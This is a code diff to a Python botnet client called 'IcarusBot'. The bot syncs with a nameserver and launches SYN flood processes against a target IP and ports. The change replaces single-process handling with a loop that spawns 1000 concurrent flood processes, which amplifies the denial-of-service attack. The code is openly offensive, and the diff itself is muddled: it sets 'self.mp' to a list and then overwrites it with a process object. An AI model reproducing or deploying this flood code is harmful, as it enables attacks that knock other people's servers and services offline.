@@ -80,7 +80,7 @@ class IcarusBot:
         self.exceptionsThrown = 0  # Tracks errors thrown during operation.
 
         # This is to deal with the active subprocess
-        self.mp = None
+        self.mp = []
 
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
@@ -204,12 +204,7 @@ class IcarusBot:
                             #                                   proc.terminate()  # sends a SIGTERM
 
                             # The following code is hilariously long and redundant, but who cares?
-                            if self.mp is None:
-                                self.mp = mp.Process(target=syn_flood.SYN_Flood,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
-                                self.mp.start()
-                            else:
-                                self.mp.terminate()
+                            for n in range(0, 1000):
                                 self.mp = mp.Process(target=syn_flood.SYN_Flood,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
